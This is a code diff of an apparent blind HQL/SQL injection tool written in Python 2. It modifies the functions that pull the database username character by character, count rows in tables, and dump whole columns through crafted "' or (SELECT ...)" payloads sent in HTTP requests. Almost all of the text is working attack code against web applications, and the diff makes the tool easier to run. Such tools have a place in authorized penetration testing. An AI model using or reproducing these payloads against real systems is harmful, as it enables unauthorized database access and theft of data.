@@ -180,7 +180,7 @@ def find_column(table, column_name):
 ###########################
 
 
-def get_dbms_username(url, param, message):
+def get_dbms_username(message):
     global TABLES
     global USER
 
@@ -192,12 +192,12 @@ def get_dbms_username(url, param, message):
     display_message("Using " + table_to_test + " to retrieve user()")
 
     # get the count of the table
-    request = "' and (SELECT count(*) FROM " + table_to_test + ") "
-    count_table = retrieve_count_or_length(url, param, message, request)
+    request = "' or (SELECT count(*) FROM " + table_to_test + ") "
+    count_table = retrieve_count_or_length(message, request)
 
     # get the length of the username
-    request = "' and (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM " + table_to_test + ") "
-    count_user = retrieve_count_or_length(url, param, message, request)
+    request = "' or (SELECT length(CONCAT(COUNT(*), '/', USER())) FROM " + table_to_test + ") "
+    count_user = retrieve_count_or_length(message, request)
 
     length_user = int(count_user) - int(count_table)
     display_message("Count of table  " + table_to_test + ": " + count_table)
@@ -206,8 +206,8 @@ def get_dbms_username(url, param, message):
     i = len(str(count_table)) + 2
     username_str = ""
     while (i <= int(count_user)):
-        request = "' and (SELECT substring(CONCAT(COUNT(*), '/', USER()), " + str(i) + ", 1) FROM " + table_to_test + ") "
-        char = int(retrieve_count_or_length(url, param, message, request, True))
+        request = "' or (SELECT substring(CONCAT(COUNT(*), '/', USER()), " + str(i) + ", 1) FROM " + table_to_test + ") "
+        char = int(retrieve_count_or_length(message, request, True))
         username_str = username_str + chr(char)
         i = i + 1
 
@@ -219,16 +219,16 @@ def get_dbms_username(url, param, message):
 ###########################
 
 
-def get_count_of_tables(url, param, message):
+def get_count_of_tables(message):
     global TABLES
 
     for table in TABLES:
-        get_count_of_table(url, param, message, table)
+        get_count_of_table(message, table)
 
 
 def get_count_of_table(message, name_table):
 
-    request = "' and (SELECT count(*) FROM " + name_table + ") "
+    request = "' or (SELECT count(*) FROM " + name_table + ") "
     count = retrieve_count_or_length(message, request)
 
     print "[!] Count(*) of " + name_table + " : " + str(count)
@@ -349,18 +349,21 @@ def display_message(message):
 
 def dump_table_by_column(table, column):
 
-    params_copy = set_payload_in_param("'and (select cast(concat('///', group_concat(" + column + "), '///') as string) from " + table + ")=1or ''='")
+    params_copy = set_payload_in_param("' or (select cast(concat('///', group_concat(" + column + "), '///') as string) from " + table + ")=1or ''='")
     req = send_HTTP_request(url, params_copy)
     results = get_result_from_dump(req.content)
     print "[" + table + "]\n\t[" + column + "]"
     for res in results:
         print "\t\t - " + res
-
+        
 
 def get_result_from_dump(content):
     regex_result = re.search(r"&quot;///(.+)///&quot;", content)
-    dump = regex_result.group(1)
-    return dump.split(',')
+    if (regex_result is not None):
+        dump = regex_result.group(1)
+        return dump.split(',')
+    else:
+        return []
 
 
 # option parser
@@ -470,10 +473,14 @@ else:
 
     # --user flag
     if (opts.user):
+        if (not opts.blind_hqli_message):
+            raise Exception('You should specify a message')
         get_dbms_username(opts.blind_hqli_message)
 
     # --count flag
     if (opts.count):
+        if (not opts.blind_hqli_message):
+            raise Exception('You should specify a message')
         if (opts.tables):
             get_count_of_table(opts.blind_hqli_message)
         elif(opts.table is not None):
